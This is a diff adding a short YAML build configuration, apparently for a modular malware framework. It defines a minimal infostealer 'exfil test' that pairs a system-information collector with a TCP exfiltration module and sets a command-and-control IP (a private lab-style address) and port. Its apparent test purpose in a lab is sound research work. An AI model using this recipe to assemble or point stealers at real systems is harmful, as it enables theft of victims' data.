@@ -1,0 +1,13 @@
+name: infostealer_cs_minimal_dynamic
+description: Minimal dynamic exfil test
+core:
+- core/emit_buffer
+collectors:
+- collectors/system_info_api
+exfil: exfil/tcp_dynamic
+arch: arch/sequential
+resources: true
+evasion: []
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
